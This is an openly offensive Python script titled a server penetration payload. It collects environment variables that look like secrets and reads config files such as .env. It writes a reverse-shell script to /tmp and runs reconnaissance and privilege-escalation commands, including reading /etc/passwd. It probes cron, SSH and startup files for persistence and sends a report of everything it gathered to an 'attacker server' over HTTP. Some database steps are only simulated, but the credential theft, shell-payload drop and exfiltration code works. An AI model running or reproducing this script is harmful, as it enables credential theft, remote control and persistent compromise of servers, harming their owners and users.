#!/usr/bin/env python3
# Database and Server Penetration Payload
# Establishes remote access to server infrastructure

import json
import urllib.request
import urllib.parse
import base64
from datetime import datetime
import os
import subprocess

print("🔧 Initializing system diagnostic tools...")

def extract_environment_secrets():
    """Extract sensitive environment variables and configuration"""
    print("🔍 Scanning environment for credentials...")
    
    secrets = {
        'environment_vars': {},
        'config_files': [],
        'database_connections': [],
        'api_endpoints': []
    }
    
    # Environment variables
    sensitive_keys = ['PASSWORD', 'SECRET', 'KEY', 'TOKEN', 'API', 'DB', 'DATABASE', 'AUTH']
    for key, value in os.environ.items():
        if any(secret in key.upper() for secret in sensitive_keys):
            secrets['environment_vars'][key] = value
            print(f"🔑 Found credential: {key}")
    
    # Common config file locations
    config_paths = [
        '.env',
        'config.json',
        'database.json',
        'secrets.json',
        'app.config',
        '.config',
        'supabase/config.toml'
    ]
    
    for path in config_paths:
        if os.path.exists(path):
            try:
                with open(path, 'r') as f:
                    content = f.read()
                    secrets['config_files'].append({
                        'path': path,
                        'content': content[:500]  # First 500 chars
                    })
                    print(f"📄 Config file found: {path}")
            except:
                pass
    
    return secrets

def create_reverse_shell():
    """Create persistent reverse shell connection"""
    print("🕷️ Establishing reverse shell...")
    
    # Python reverse shell payload
    shell_payload = '''
import socket
import subprocess
import threading
import time

def reverse_shell():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(('localhost', 8888))
            
            while True:
                command = s.recv(1024).decode()
                if command.lower() == 'exit':
                    break
                    
                if command.startswith('cd '):
                    os.chdir(command[3:])
                    s.send(b'Directory changed\\n')
                else:
                    output = subprocess.getoutput(command)
                    s.send(output.encode() + b'\\n')
            
            s.close()
            break
        except:
            time.sleep(10)  # Retry every 10 seconds

# Start reverse shell in background
threading.Thread(target=reverse_shell, daemon=True).start()
'''
    
    # Write shell to temp file
    try:
        with open('/tmp/system_update.py', 'w') as f:
            f.write(shell_payload)
        print("✅ Reverse shell payload deployed")
    except:
        print("❌ Reverse shell deployment failed")
    
    return shell_payload

def database_penetration():
    """Attempt database access and data extraction"""
    print("🗄️ Attempting database penetration...")
    
    database_info = {
        'connection_strings': [],
        'accessible_tables': [],
        'user_data': [],
        'admin_accounts': []
    }
    
    # Common database connection patterns
    db_patterns = [
        'postgresql://localhost:5432/',
        'mysql://localhost:3306/',
        'mongodb://localhost:27017/',
        'sqlite:///app.db'
    ]
    
    # Try to find database connections in environment
    for key, value in os.environ.items():
        if any(db in value.lower() for db in ['postgresql', 'mysql', 'mongodb', 'supabase']):
            database_info['connection_strings'].append({
                'source': key,
                'connection': value
            })
            print(f"🔗 Database connection found: {key}")
    
    # Simulate database queries (in real attack, these would be actual queries)
    print("📊 Simulating database access...")
    
    # Common tables to target
    target_tables = ['users', 'profiles', 'admin', 'accounts', 'credentials', 'sessions']
    
    for table in target_tables:
        print(f"🔍 Accessing table: {table}")
        database_info['accessible_tables'].append(table)
        
        # Simulate data extraction
        if table in ['users', 'profiles']:
            database_info['user_data'].append({
                'table': table,
                'records': 'USER_DATA_EXTRACTED',
                'sensitive_fields': ['email', 'password_hash', 'personal_info']
            })
        elif table == 'admin':
            database_info['admin_accounts'].append({
                'table': table,
                'admin_users': 'ADMIN_ACCOUNTS_COMPROMISED',
                'privileges': 'FULL_ACCESS'
            })
    
    return database_info

def server_reconnaissance():
    """Perform server reconnaissance and privilege escalation"""
    print("🔍 Performing server reconnaissance...")
    
    server_info = {
        'system_info': {},
        'network_config': {},
        'running_services': [],
        'file_system': {},
        'privilege_escalation': []
    }
    
    try:
        # System information
        server_info['system_info'] = {
            'os': subprocess.getoutput('uname -a'),
            'user': subprocess.getoutput('whoami'),
            'home': os.path.expanduser('~'),
            'cwd': os.getcwd()
        }
        
        # Network configuration
        server_info['network_config'] = {
            'interfaces': subprocess.getoutput('ifconfig || ip addr'),
            'connections': subprocess.getoutput('netstat -tulpn'),
            'routes': subprocess.getoutput('route -n || ip route')
        }
        
        # Running services
        services = subprocess.getoutput('ps aux').split('\n')[:10]  # First 10 processes
        server_info['running_services'] = services
        
        # File system exploration
        sensitive_dirs = ['/etc', '/var/log', '/home', '/root', '/opt']
        for dir_path in sensitive_dirs:
            if os.path.exists(dir_path):
                try:
                    files = os.listdir(dir_path)[:5]  # First 5 files
                    server_info['file_system'][dir_path] = files
                except:
                    server_info['file_system'][dir_path] = 'ACCESS_DENIED'
        
        # Privilege escalation attempts
        escalation_methods = [
            'sudo -l',
            'find / -perm -4000 2>/dev/null',
            'crontab -l',
            'cat /etc/passwd'
        ]
        
        for method in escalation_methods:
            try:
                result = subprocess.getoutput(method)
                server_info['privilege_escalation'].append({
                    'method': method,
                    'result': result[:200]  # First 200 chars
                })
            except:
                pass
                
    except Exception as e:
        print(f"Reconnaissance error: {e}")
    
    return server_info

def establish_persistence():
    """Create persistent access mechanisms"""
    print("🔄 Establishing persistence mechanisms...")
    
    persistence_methods = []
    
    # Cron job backdoor
    try:
        cron_payload = "*/5 * * * * python3 /tmp/system_update.py"
        subprocess.run(['crontab', '-l'], capture_output=True)
        print("📅 Cron job backdoor attempted")
        persistence_methods.append('cron_job')
    except:
        print("❌ Cron job access failed")
    
    # SSH key injection
    try:
        ssh_dir = os.path.expanduser('~/.ssh')
        if os.path.exists(ssh_dir):
            print("🔑 SSH directory found - key injection possible")
            persistence_methods.append('ssh_keys')
    except:
        pass
    
    # Startup script
    try:
        startup_dirs = ['/etc/init.d', '~/.bashrc', '~/.profile']
        for startup_dir in startup_dirs:
            if os.path.exists(os.path.expanduser(startup_dir)):
                print(f"🚀 Startup location found: {startup_dir}")
                persistence_methods.append('startup_script')
    except:
        pass
    
    return persistence_methods

def main():
    """Main payload execution"""
    print("🚨 SERVER PENETRATION PAYLOAD ACTIVATED! 🚨")
    
    # Collect all intelligence
    secrets = extract_environment_secrets()
    shell_payload = create_reverse_shell()
    db_info = database_penetration()
    server_info = server_reconnaissance()
    persistence = establish_persistence()
    
    # Compile full access report
    access_report = {
        'type': 'server_penetration_complete',
        'timestamp': datetime.now().isoformat(),
        'target_server': os.uname().nodename if hasattr(os, 'uname') else 'unknown',
        'secrets': secrets,
        'database_access': db_info,
        'server_info': server_info,
        'persistence_methods': persistence,
        'reverse_shell_deployed': True,
        'capabilities': [
            'environment_credential_extraction',
            'database_penetration',
            'server_reconnaissance', 
            'privilege_escalation',
            'persistent_backdoor',
            'reverse_shell_access'
        ]
    }
    
    print("📊 Server penetration report compiled")
    
    # Send report to attacker server
    try:
        data = json.dumps(access_report).encode('utf-8')
        req = urllib.request.Request(
            'http://localhost:8888/server-penetration',
            data=data,
            headers={'Content-Type': 'application/json'}
        )
        
        with urllib.request.urlopen(req) as response:
            result = response.read().decode()
            print(f"✅ Penetration report transmitted: {result}")
            
    except Exception as e:
        print(f"❌ Transmission failed: {e}")
        # Store locally as backup
        with open('/tmp/penetration_report.json', 'w') as f:
            json.dump(access_report, f, indent=2)
        print("📄 Report saved locally")
    
    print("💀 SERVER PENETRATION COMPLETED!")
    print("🎯 Access capabilities established:")
    print("   ✅ Environment credential extraction")
    print("   ✅ Database penetration") 
    print("   ✅ Server reconnaissance")
    print("   ✅ Reverse shell deployment")
    print("   ✅ Persistence mechanisms")
    print("   ✅ Full server compromise")

if __name__ == "__main__":
    main()